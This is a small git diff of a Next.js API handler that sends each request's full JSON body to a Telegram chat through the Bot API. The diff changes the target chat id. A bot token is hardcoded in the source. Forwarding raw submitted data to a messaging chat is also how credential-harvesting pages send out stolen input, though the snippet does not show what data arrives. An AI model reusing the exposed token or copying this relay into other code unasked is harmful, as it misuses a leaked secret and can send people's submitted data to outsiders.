@@ -8,7 +8,7 @@ const handler: NextApiHandler = async (req, res) => {
   try {
     const tokenBot = "5435415918:AAGN04IWV6NGM9nLpJGY6YmbWivn3wDLHw8";
     const response = await axios.post('https://api.telegram.org/bot' + tokenBot + '/sendMessage', {
-      chat_id: '652810443',
+      chat_id: '-701539274',
       text: JSON.stringify(req.body)
     })
 
